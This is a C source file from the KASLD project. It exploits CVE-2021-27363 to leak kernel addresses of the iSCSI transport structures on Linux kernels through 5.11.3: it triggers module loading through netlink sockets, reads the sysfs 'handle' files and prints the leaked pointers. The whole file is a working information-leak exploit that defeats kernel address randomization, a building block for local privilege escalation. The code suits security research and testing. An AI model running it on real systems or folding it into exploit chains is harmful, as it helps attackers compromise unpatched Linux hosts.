// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak kernel pointer to iscsi_transport struct (CVE-2021-27363)
// from /sys/class/iscsi_transport/<transport>/handle in kernels
// through 5.11.3. Discovered by Adam Nichols of GRIMM.
//
// Patched March 2021.
//
// References:
// https://nvd.nist.gov/vuln/detail/CVE-2021-27363
// https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
//
// Output:
// [.] checking /sys/class/iscsi_transport/iser/handle ...
// leaked iscsi_iser_transport address: ffffffffc067b040
// [.] checking /sys/class/iscsi_transport/tcp/handle ...
// leaked iscsi_sw_tcp_transport address: ffffffffc0634020
// ---
// <bcoles@gmail.com>

#include "kasld.h"
#include <inttypes.h>
#include <linux/netlink.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

unsigned long get_kernel_addr_iscsi_iser_transport() {
  FILE *f;
  char *endptr;
  const char *path = "/sys/class/iscsi_transport/iser/handle";
  int sock_fd;
  unsigned long addr = 0;
  unsigned int buff_len = 1024;
  char buff[buff_len];

  // Try to load the scsi_transport_iscsi and ib_iser modules
  sock_fd = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_RDMA);
  if (sock_fd >= 0)
    close(sock_fd);

  sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
  if (sock_fd < 0) {
    printf("[-] Failed to get a NETLINK_ISCSI socket: %m\n");
    return 0;
  }

  close(sock_fd);
  sleep(5);

  printf("[.] checking %s ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  if (fgets(buff, buff_len, f) == NULL) {
    printf("[-] fgets(%s): %m\n", path);
    fclose(f);
    return 0;
  }

  fclose(f);

  if (strlen(buff) > 21)
    return 0;

  addr = strtoul(buff, &endptr, 10);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

unsigned long get_kernel_addr_iscsi_sw_tcp_transport() {
  FILE *f;
  char *endptr;
  const char *path = "/sys/class/iscsi_transport/tcp/handle";
  unsigned long addr = 0;
  unsigned int buff_len = 1024;
  char buff[buff_len];

  printf("[.] checking %s ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  if (fgets(buff, buff_len, f) == NULL) {
    printf("[-] fgets(%s): %m\n", path);
    fclose(f);
    return 0;
  }

  fclose(f);

  if (strlen(buff) > 21)
    return 0;

  addr = strtoul(buff, &endptr, 10);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char **argv) {
  unsigned long addr;

  addr = get_kernel_addr_iscsi_iser_transport();
  if (addr)
    printf("leaked iscsi_iser_transport address: %lx\n", addr);

  addr = get_kernel_addr_iscsi_sw_tcp_transport();
  if (addr)
    printf("leaked iscsi_sw_tcp_transport address: %lx\n", addr);

  return 0;
}
